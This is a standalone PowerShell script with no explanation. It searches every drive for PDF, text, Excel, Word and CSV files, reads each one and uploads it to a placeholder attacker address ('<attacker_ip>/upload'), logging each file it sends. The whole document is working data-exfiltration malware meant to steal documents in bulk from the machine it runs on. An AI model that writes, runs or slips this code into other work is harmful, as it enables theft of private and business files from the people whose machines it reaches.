$uri = "http://<attacker_ip>/upload"
$files = @(".pdf", ".txt", ".xlsx", ".docx", ".csv")
$drives = Get-PSDrive -PSProvider FileSystem

foreach ($drive in $drives) {
    $foundFiles = Get-ChildItem -Path $drive":\" -Recurse -Force

    $filteredFiles = $foundFiles | Where-Object { $files -contains $($_.Extension.ToLower()) }

    foreach ($file in $filteredFiles) {
        Write-Host "File found: $($file.FullName)"

        $fileContent = [System.IO.File]::ReadAllBytes($file.FullName)
        $boundary = [Guid]::NewGuid().ToString()

        $headers = @{
            "Content-Type" = "multipart/form-data; boundary=$boundary"
        }

        $body = "--$boundary`r`n"
        $body += "Content-Disposition: form-data; name=`"file`"; filename=`"$($file.Name)`"`r`n"
        $body += "Content-Type: application/octet-stream`r`n`r`n"
        $body += [System.Text.Encoding]::ASCII.GetString($fileContent) + "`r`n"
        $body += "--$boundary--`r`n"

        try {
            $response = Invoke-WebRequest -Uri $uri -Method Post -Headers $headers -Body $body
            Write-Host "Upload Successfully: $($file.FullName)"
        } catch {
            Write-Host "Something went wrong: $($file.FullName). Error: $_"
        }
    }
}
